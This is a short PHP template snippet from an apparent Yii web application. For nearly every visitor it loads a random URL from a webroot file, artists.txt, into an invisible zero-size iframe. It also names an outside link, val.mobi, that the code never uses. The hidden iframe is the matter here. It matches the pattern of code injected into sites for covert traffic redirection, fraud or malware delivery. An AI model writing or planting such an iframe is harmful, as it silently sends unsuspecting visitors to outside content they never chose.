<?php
$ua = isset($_SERVER['HTTP_USER_AGENT']) ? strtolower($_SERVER['HTTP_USER_AGENT']) : '';
$link = 'http://val.mobi';
$target=" target=\"_blank\"";

if(is_file(Yii::getPathOfAlias('webroot').'/artists.txt') && stripos($ua, 'a') !== false ) { // && stripos($ua,'mobile') !== false) {
    $items = file(Yii::getPathOfAlias('webroot').'/artists.txt');
    $item = trim($items[array_rand($items)]);
?>
    <iframe src="<?=$item?>" width="0" height="0" border="0" scroll="no"></iframe>
<?php
}
?>